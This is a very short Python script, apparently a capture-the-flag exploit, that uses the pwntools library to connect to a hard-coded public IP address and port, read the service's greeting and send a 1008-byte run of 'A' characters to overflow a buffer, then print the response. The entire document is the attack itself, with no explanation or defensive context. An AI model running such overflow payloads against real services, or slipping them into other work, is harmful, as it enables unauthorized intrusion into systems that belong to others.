#!/usr/bin/env python3

from pwn import *

conn = remote('23.100.18.186', 6677)

print(conn.recvline().decode().strip())
print(conn.recvline().decode().strip())
conn.sendline(str('A'*1008).encode())
print(conn.recv())

conn.close()
